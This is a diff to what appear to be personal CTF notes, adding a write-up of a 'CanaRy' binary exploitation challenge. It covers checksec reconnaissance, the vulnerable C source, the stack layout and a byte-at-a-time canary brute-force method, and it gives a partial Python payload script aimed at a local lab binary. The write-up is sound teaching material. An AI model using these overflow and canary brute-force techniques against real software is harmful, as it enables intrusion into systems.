@@ -1952,7 +1952,138 @@ This approach of translating into a higher level language is a standard way of r
 ## CanaRy - Binary Exploitation
 A canary is just a random value on the stack in between the local variables and the return address. Thus if an attacker overwrites it by trying to overwrite the return address, the attacker will change the value of the canary and the program will exit immediately.  
 
+Reconissance:
+```console
+$ file vuln
+vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6cfe75e5f3db954bad5a09eb57527c5a0d727b8f, not stripped
+$ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
+```
+No canary means that the program has a custom canary implementation. The program also has ASLR/PIE and NX enabled (non executable stack).
 
+Like every other binary challenge, code to make exploitation easier (no buffering stdout and makes sure priveleges aren't dropped)
+```c
+setvbuf(stdout, NULL, _IONBF, 0);
+
+int i;
+gid_t gid = getegid();
+setresgid(gid, gid, gid);
+```
+
+The read_canary() function:
+```c
+void read_canary() {
+  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
+  if (f == NULL) {
+    printf("[ERROR]: Trying to Read Canary\n");
+    exit(0);
+  }
+  fread(key,sizeof(char),KEY_LEN,f);
+  fclose(f);
+}
+```
+Canary is read from a file called canary.txt and puts the canary in a global variable called key.
+
+```c
+#define KEY_LEN 4
+...
+char key[KEY_LEN];
+```
+We see that the key canary is only 4 bytes.
+
+There's a constant canary since the canary is read from a file which allows the canary to be bruteforced. Usually this isn't found in the wild except in fork servers where all the children processes have the same canary or in Windows XP's kernel.  
+
+Let's look at the vuln() function:
+```c
+...
+char canary[KEY_LEN];
+char buf[BUF_SIZE];
+char user_len[BUF_SIZE];
+...
+```
+This order of declaration means the stack looks like this:
+```
+[RETURN ADDRESSS]
+[ Old Saved EBP ]
+[ Canary Buffer ]
+[   Buf buffer  ]
+[user_len buffer]
+```
+
+```c
+...
+memcpy(canary,key,KEY_LEN);
+...
+```
+This copies the canary from `key` to `canary`. This is also usually how it work. The cananry is copied from a "master cookie" (stored in a hidden location) at the beginning of the function.  
+
+The following just reads a length from the user:
+```c
+while (x<BUF_SIZE) {
+      read(0,user_len+x,1);
+      if (user_len[x]=='\n') break;
+      x++;
+}
+sscanf(user_len,"%d",&count);
+```
+
+This reads user input, but it trusts the length we give. Since we control `count`, we can cause a buffer overflow.
+```c
+read(0,buf,count);
+```
+
+This just checks if the canary was overwritten:
+```c
+if (memcmp(canary,key,KEY_LEN)) {
+  printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
+  exit(-1);
+}
+```
+
+We want to jump to the flag after bypassing the canary:
+```c
+void display_flag() {
+  char buf[FLAG_LEN];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+  fgets(buf,FLAG_LEN,f);
+  puts(buf);
+  fflush(stdout);
+}
+```
+
+The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won't see the ```*** Stack Smashing Detected ***``` message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite the saved EBP, and then overwrite the return address with the address of display_flag().
+
+Gynvael uses IDA to make sure the buffer is right next to the canary in memory.
+
+Script to find canary:
+```python
+import subprocess
+
+def call(sz, a, b, c, d):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(a) + chr(b) + chr(c) + chr(d) + '\n'
+
+  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  print stdout
+
+call(33, 0, 0, 0, 0) # Test the call function
+```
+
+Test the script locally:
+```console
+$ python go.py
+
+```
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
@@ -1961,6 +2092,7 @@ A canary is just a random value on the stack in between the local variables and 
 * For network dumps there are two main tools: Wireshark and NetworkMiner
 * Gynvael recommends working on ctf challenges remotely in most cases since in many cases an exploit could work locally but not remotely (like in the above case).
 * On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.
+* calling exit() still means the destructors are still called. An attacker can use the destructor call to their advantage. Use \_exit instead with the underscore.
 
 ## TODO 
 * Fix all the weird non ascii apostrophes and double quotes
